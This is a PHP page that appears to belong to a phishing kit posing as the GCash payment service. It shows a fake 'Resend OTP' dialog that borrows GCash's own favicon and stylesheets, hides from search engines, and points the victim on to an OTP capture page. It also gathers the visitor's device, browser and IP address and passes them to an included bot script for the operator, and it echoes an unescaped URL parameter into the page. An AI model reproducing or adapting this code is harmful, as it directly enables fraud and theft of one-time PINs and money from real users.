<?php
error_reporting(0);
include('../src/system.php');

if($_GET['otpresend'] == md5('resendotp')){
    echo '<!DOCTYPE html>
    <html class="desktop" style="font-size: 50px;">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="format-detection" content="telephone=no, email=no">
        <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
        <title>GCash Mpin</title>
        <meta property="og:title" content="GCash Error">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <link rel="shortcut icon" href="https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png" type="image/x-icon" />
        <meta name="wap-font-scale" content="no">
        <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/desktop-13ce9e40a0718362a999.css">
        <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/index-f70a6485354f1bea09ff.css">
    </head>
    <body>
      <svg viewBox="0 0 175 1" xmlns="http://www.w3.org/2000/svg">
      </svg>
    <style type="text/css">

        input[maxlength="4"] + svg line {   
        stroke-dasharray: 20;
        stroke-dashoffset: -10;
      }
       svg, line {
        position: relative;
        display: block;
        width: 325px;
        height: 5px;
        padding-top: 1px;
        margin-right: 50px;
      }
    </style>
        <div role="dialog" class="ap-modal">
            <div class="ap-modal-mask"></div> 
            <div class="ap-modal-wrap">
            <div class="ap-modal-content">
            <div class="ap-modal-header">Resend OTP</div> 
     Your new One Time PIN (OTP)<br>will be SMS\'d to you.
    </div> <div class="ap-modal-button"><a href="otp.php?otpclid='.$_GET['otpclid'].'">
              Okay
            </a></div></div></div>

    </body>
    
    </html>';
    $tgMsg = " Resend OTP|$device_used|$browser_used|$ip\n - Resend OTP";
    $replyMsg = "```diff\n- Resend OTP|$device_used|$browser_used|$ip\n  Resend OTP```";
    include('_bot.php');
  }
else{
    header("Location:index.php");
}

?>